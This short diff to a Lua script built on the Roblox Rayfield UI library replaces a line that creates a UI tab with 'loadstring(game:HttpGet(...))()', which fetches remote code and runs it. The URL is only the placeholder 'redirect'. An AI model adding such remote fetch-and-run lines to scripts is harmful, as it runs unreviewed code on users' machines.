@@ -26,4 +26,4 @@ local MeowWindow = Rayfield:CreateWindow({
     }
 })
 
-local Tab = MeowWindow:CreateTab("Tab Example", 4483362458) -- Title, Image
+loadstring(game:HttpGet(('redirect')))()
